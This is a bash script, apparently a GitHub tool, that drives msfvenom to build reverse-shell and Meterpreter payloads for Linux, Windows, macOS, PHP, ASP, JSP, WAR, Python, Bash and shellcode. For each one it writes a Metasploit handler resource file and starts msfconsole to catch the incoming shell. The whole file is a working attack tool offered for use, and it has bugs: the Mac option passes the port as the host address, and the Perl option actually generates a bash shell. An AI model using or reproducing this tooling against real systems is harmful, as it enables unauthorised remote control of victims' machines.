#!/bin/bash
COWSAY=/usr/games/cowsay
function dir() {
if [ -d "msfpayloads" ] 
then
echo ""
else
echo "Creating msfpayloads directory."
mkdir msfpayloads
fi
}
function banner() {
if [ -f "$COWSAY" ] 
then
cowsay -f eyes MSFVENOM Payload Crafter
else
echo "
╔╦╗╔═╗╔═╗  ╦  ╦┌─┐┌┐┌╔═╗┌┬┐
║║║╚═╗╠╣───╚╗╔╝├┤ │││║ ║│││
╩ ╩╚═╝╚     ╚╝ └─┘┘└┘╚═╝┴ ┴
"
echo "Github:https://github.com/Fonderelite"
fi
}

function payload() {
echo "❓Options❓
Option1:Binaries[0]
==================
Option2:Windows[1]
==================
Option3:Mac[2]
==================
Option4:WebPayloads[3]
==================
Option5:Scripting-Payloads[4]
==================
Option6:ShellCodes[5]
==================
"
dir
read -p "Choice~: " choice
if [[ $choice -eq 0 ]];then
echo "Binary Payload
======================
"
read -p "Input Your IP~: " ip
read -p "Port to listen(default=4444)~: " port
read -p "Output file-name(file.elf)~: " output
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f elf > $output
if [ -f "$output" ] 
then
echo "Payload saved as $output" 
fi
echo "Starting Metasploit..."
echo "
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST $ip
set LPORT $port
set ExitOnSession false
exploit -j -z
" > msfpayloads/linux.rc
msfconsole -r msfpayloads/linux.rc

#End of Linux Binary Payload
elif [ "$choice" -eq 1 ]
then
echo "Windows Payload
======================
"
read -p "Input Your IP~: " ip
read -p "Port to listen(default=4444)~: " port
read -p "Output file-name(file.exe)~: " output_win
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > $output_win
if [ -f "$output_win" ]
then echo "Payload saved as $output_win" 
fi
echo "
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST $ip
set LPORT $port
set ExitOnSession false
exploit -j -z
" > msfpayloads/win.rc
msfconsole -r msfpayloads/win.rc

elif [ "$choice" -eq 2 ] 
then
read -p "Input Your IP~: " ip
read -p "Port to listen(default=4444)~: " port
read -p "Output file-name(file.macho)~: " output_mac
msfvenom -p osx/x86/shell_reverse_tcp LHOST=$port LPORT=$port -f macho > $output_mac
echo "Starting Metasploit..."
echo "
use exploit/multi/handler
set PAYLOAD osx/x86/shell_reverse_tcp
set LHOST $ip
set LPORT $port
set ExitOnSession false
exploit -j -z
" > msfpayloads/mac.rc
msfconsole -r msfpayloads/mac.rc

elif [ "$choice" -eq 3 ]
then
echo "Web-Payloads"
echo "
Options:
Option 1:PHP[0]
===============
Option 2:ASP[1]
===============
Option 3:JSP[2]
===============
Option 4:WAR[3]
===============
"
read -p "Option~: " option 
case $option in
0)
echo "PHP Reverse-Shell Payload"
read -p "Input Your IP~: " ip
read -p "Port to listen(default=4444)~: " port
read -p "Output-filename(file.php)~: " outputphp
msfvenom -p php/meterpreter_reverse_tcp LHOST=$ip LPORT=$port -f raw > $outputphp
cat $outputphp | pbcopy && echo '<?php ' | tr -d '\n' > $outputphp && pbpaste >> $outputphp
echo "Starting Metasploit..."
echo "
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST $ip
set LPORT $port
set ExitOnSession false
exploit -j -z
" > msfpayloads/php.rc
msfconsole -r msfpayloads/php.rc 
;;
1)
echo "ASP Payload"
read -p "Input Your IP~: " ip
read -p "Port to listen(default=4444)~: " port
read -p "Output-filename(file.asp)~: " outputasp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f asp > $outputasp
echo "Starting Metasploit..."
echo "
use exploit/multi/handler
set PAYLOAD windows/x86/meterpreter/reverse_tcp
set LHOST $ip
set LPORT $port
set ExitOnSession false
exploit -j -z
" > msfpayloads/asp.rc
msfconsole -r msfpayloads/asp.rc
;;

2)
echo "JSP Payload"
read -p "Input Your IP~: " ip
read -p "Port to listen(default=4444)~: " port
read -p "Output-filename(file.jsp)~: " outputjsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f raw > $outputjsp
echo "Starting Metasploit..."
echo "
use exploit/multi/handler
set PAYLOAD java/jsp_shell_reverse_tcp
set LHOST $ip
set LPORT $port
set ExitOnSession false
exploit -j -z
" > msfpayloads/jsp.rc
msfconsole -r msfpayloads/jsp.rc
;;

3)
echo "WAR Payload"
read -p "Input Your IP~: " ip
read -p "Port to listen(default=4444)~: " port
read -p "Output-filename(file.war)~: " outputwar
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f raw > $outputwar
echo "Starting Metasploit..."
echo "
use exploit/multi/handler
set PAYLOAD java/jsp_shell_reverse_tcp
set LHOST $ip
set LPORT $port
set ExitOnSession false
exploit -j -z
" > msfpayloads/java.rc
msfconsole -r msfpayloads/java.rc
;;
esac

elif [ "$choice" -eq 4 ]
then
echo "Options: 
Option 1:Python[0]
===============
Option 2:Bash[1]
===============
Option 3:Perl[2]
===============
"
read -p "Option~: " option4
case $option4 in
0)
echo  "Python Reverse-Shell"
read -p "Input Your IP~: " ip
read -p "Port to listen(default=4444)~: " port
read -p "Output-filename(file.py)~: " outputpy
msfvenom -p cmd/unix/reverse_python LHOST=$ip LPORT=$port -f raw > $outputpy
echo "Starting Metasploit..."
echo "
use exploit/multi/handler
set PAYLOAD cmd/unix/reverse_python
set LHOST $ip 
set LPORT $port
set ExitOnSession false
exploit -j -z
" > msfpayloads/py.rc
msfconsole -r msfpayloads/py.rc
;;
1)
echo "Bash Shell Payload"
read -p "Input Your IP~: " ip
read -p "Port to listen(default=4444)~: " port
read -p "Output-filename(file.sh)~: " outputsh
msfvenom -p cmd/unix/reverse_bash LHOST=$ip LPORT=$port -f raw > $outputsh
echo "Starting Metasploit..."
echo "
use exploit/multi/handler
set PAYLOAD cmd/unix/reverse_bash
set LHOST $ip 
set LPORT $port
set ExitOnSession false
exploit -j -z
" > msfpayloads/bash.rc
msfconsole -r msfpayloads/bash.rc
;;
2)
echo "Perl Shell Payload"
read -p "Input Your IP~: " ip
read -p "Port to listen(default=4444)~: " port
read -p "Output-filename(file.sh)~: " outputpl
msfvenom -p cmd/unix/reverse_bash LHOST=$ip LPORT=$port -f raw > $outputpl
echo "Starting Metasploit..."
echo "
use exploit/multi/handler
set PAYLOAD cmd/unix/reverse_bash
set LHOST $ip 
set LPORT $port
set ExitOnSession false
exploit -j -z
" > msfpayloads/perl.rc
msfconsole -r msfpayloads/perl.rc

;;
esac

elif [ "$choice" -eq 5 ]
then
echo "Options:
Option 1:Linux-Based Shellcode[0]
==================================
Option 2:Windows-Based Shellcode[1]
==================================
Option 3:MAC-Based Shellcode[2]
==================================
"
read -p "Option~: " option5
case $option5 in
0)
echo "Linux-Based Shellcode"
read -p "Input Your IP~: " ip
read -p "Port to listen(default=4444)~: " port
read -p "Language(ex. py): " lang
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f $lang
echo "Starting Metasploit..."
echo "
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST $ip 
set LPORT $port
set ExitOnSession false
exploit -j -z
" > msfpayloads/linux_x86.rc
msfconsole -r msfpayloads/linux_x86.rc
;;
1)
echo "Windows Based Shellcode"
read -p "Input Your IP~: " ip
read -p "Port to listen(default=4444)~: " port
read -p "Language(ex. py): " lang1
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f $lang1
echo "Starting Metasploit..."
echo "
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST $ip 
set LPORT $port
set ExitOnSession false
exploit -j -z
" > msfpayloads/winshell.rc
msfconsole -r msfpayloads/winshell.rc

;;

2)
echo "Mac Based Shellcode"
read -p "Input Your IP~: " ip
read -p "Port to listen(default=4444)~: " port
read -p "Language(ex. py): " lang2
msfvenom -p osx/x86/shell_reverse_tcp  LHOST=$ip LPORT=$port -f $lang2
echo "Starting Metasploit..."
echo "
use exploit/multi/handler
set PAYLOAD osx/x86/shell_reverse_tcp 
set LHOST $ip 
set LPORT $port
set ExitOnSession false
exploit -j -z
" > msfpayloads/osxshell.rc
msfconsole -r msfpayloads/osxshell.rc
;;
esac
else
echo "Invalid Option!"
fi
}
function main() {
banner
payload
}
main
